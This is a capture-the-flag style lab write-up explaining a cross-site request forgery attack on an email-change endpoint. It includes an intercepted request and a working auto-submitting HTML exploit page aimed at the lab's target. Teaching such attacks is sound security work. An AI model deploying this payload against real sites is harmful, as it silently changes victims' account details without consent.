# Lab: CSRF Vulnerability with No Defenses

## Vulnerability
This lab demonstrates a **Cross-Site Request Forgery (CSRF)** vulnerability where the application performs sensitive actions without 
verifying whether the request originated from a legitimate user interaction.

---

## Explanation
The application allows an authenticated user to change their email address. However, it does not implement any CSRF protection mechanisms, 
such as CSRF tokens or Origin/Referer validation.

An attacker can create a malicious web page containing a forged request. If a logged-in user visits this page, their browser 
automatically includes the session cookie with the request, causing the server to process it as a legitimate request.

---

## Steps to Reproduce

### 1. Login
- Login using the credentials provided by the lab.

---

### 2. Change Email
- Navigate to the email update page.
- Change the email address.
- Intercept the request using Burp Suite.

<img width="371" height="301" alt="image" src="https://github.com/user-attachments/assets/b7e4bb0e-6f05-481f-80ac-39737abbd748" />

---

### 3. Analyze the Request
Observe the HTTP request responsible for updating the email address.

Example:

```http
POST /my-account/change-email HTTP/1.1

email=test@example.com
```

<img width="1166" height="364" alt="image" src="https://github.com/user-attachments/assets/eb18f080-d611-4e76-b3f5-7a12871fd151" />

---

### 4. Generate the CSRF Exploit
- Right-click the intercepted request in Burp Suite.
- Use the request to generate a CSRF PoC (or manually create the HTML form when using Burp Suite Community Edition).
- Copy the generated HTML to the Exploit Server.

Example:

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://target-acb91feb1e053ea78076271500a20022.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

---

### 5. Deliver the Exploit
- Store the exploit on the Exploit Server.
- Deliver the exploit to the victim.

---

### 6. Result
When the victim visits the exploit page while logged in, their browser automatically sends the authenticated request.

The server processes the request and updates the victim's email address without their knowledge.

---

## Impact
- Unauthorized execution of sensitive actions.
- Modification of user account information.
- Potential account compromise depending on the affected functionality.

---

## Learning
CSRF attacks exploit the browser's automatic inclusion of authenticated session cookies. Without proper server-side validation, an 
attacker can trick a logged-in user into performing unintended actions simply by visiting a malicious webpage.
